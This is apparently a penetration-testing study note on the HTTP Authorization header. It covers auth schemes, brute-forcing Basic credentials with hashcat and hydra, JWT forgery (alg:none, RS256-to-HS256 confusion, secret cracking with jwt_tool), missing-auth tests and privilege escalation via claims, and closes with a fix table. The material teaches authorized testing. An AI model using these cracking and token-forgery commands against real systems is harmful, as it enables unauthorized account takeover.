---
tags: [vapt, http-headers, web, intermediate]
difficulty: intermediate
module: "03 - HTTP Headers"
topic: "03.18 Authorization — Bearer Abuse, Basic Cracking"
portswigger_labs: ["Authentication labs", "JWT labs"]
---

# 03.18 — Authorization

## What is it?

The `Authorization` request header carries credentials to authenticate the client with the server. It uses the format `<scheme> <credentials>`. This is the primary way APIs authenticate requests. Weak or misconfigured Authorization is a critical attack surface.

---

## Authorization Schemes

```
Basic:
  Authorization: Basic dXNlcjpwYXNzd29yZA==
  (base64-encoded "user:password" — NOT encrypted!)

Bearer (JWT or opaque token):
  Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

Digest:
  Authorization: Digest username="admin", realm="...", response="hash"

API Key (sometimes in this header):
  Authorization: ApiKey abc123xyz

NTLM:
  Authorization: NTLM TlRMTVNTUAABAAAA...
```

---

## Attack 1: Basic Auth Cracking

```
Basic auth encodes "user:password" in base64 — NOT encryption!
It's trivially reversible.

DECODE:
  echo "dXNlcjpwYXNzd29yZA==" | base64 -d
  → user:password

OFFLINE CRACK (if captured):
  # Extract hash from network capture or log
  hashcat -m 10 user:hash /usr/share/wordlists/rockyou.txt

BRUTE FORCE via Burp Intruder:
  Authorization: Basic <payload>  (base64(user:FUZZ))
  
  Generate wordlist:
  while read pass; do echo -n "admin:$pass" | base64; done < rockyou.txt

HYDRA:
  hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    target.com http-get /admin -s 443 -S
```

---

## Attack 2: Bearer Token Abuse (JWT)

```
JWT FORMAT:
  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9   ← header (base64)
  .eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9  ← payload (base64)
  .SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  ← signature

DECODE:
  echo "eyJ1c2VyIjoiYWRtaW4i..." | base64 -d
  → {"user":"admin","role":"user"}

ATTACK 1: Algorithm confusion (alg:none):
  Change header to: {"alg":"none","typ":"JWT"}
  Remove signature entirely
  Some libraries accept this!

ATTACK 2: Weak secret brute force:
  hashcat -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt

ATTACK 3: RS256 → HS256 confusion:
  Server expects RS256 (asymmetric)
  Attacker switches to HS256 with public key as secret
  → Forge valid JWT!

Tools: jwt.io (decode), jwt_tool, Burp JWT Editor extension
```

**PortSwigger Labs:** JWT attacks (8 labs)

---

## Attack 3: Missing Authorization Header

```
TEST EVERY ENDPOINT:
  Remove Authorization header completely → still works? → Auth bypass!
  Send invalid token → still works? → Auth not validated!
  
  Common in:
  - Internal APIs exposed accidentally
  - Debug endpoints (/api/debug, /api/health/detailed)
  - Old API versions (/api/v1/ when /api/v2/ is secured)
```

---

## Attack 4: Privilege Escalation via Token Claims

```
JWT payload claims control permissions:
  {"user": "alice", "role": "user", "admin": false}
  
  Modify to:
  {"user": "alice", "role": "admin", "admin": true}
  
  If signature not properly validated → privilege escalation!

For opaque tokens:
  user_token = "user_abc123"
  admin_token = "admin_xyz789"
  
  Try using user token for admin endpoints.
```

---

## Testing Authorization

```bash
# Test without Authorization header
curl https://target.com/api/users

# Test with empty Bearer
curl -H "Authorization: Bearer " https://target.com/api/users
curl -H "Authorization: Bearer null" https://target.com/api/users
curl -H "Authorization: Bearer undefined" https://target.com/api/users

# Decode JWT
echo "eyJ..." | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Crack JWT
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt

# Test alg:none
python3 jwt_tool.py <token> -X a  # alg=none attack
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| Basic auth over HTTP | Only use Basic auth over HTTPS |
| Weak JWT secret | Use 256-bit random secret minimum |
| JWT algorithm confusion | Explicitly whitelist allowed algorithms |
| No auth validation | Validate every request to protected endpoints |

---

## Related Notes
- [[02.13 - HTTP Authentication Schemes]] — all auth schemes detailed
- [[Module 04 - JWT Attacks]] — full JWT exploitation
- [[Module 05 - Authentication Bypass]] — authentication attack patterns
- [[17 - Cookie]] — cookie-based auth alternative
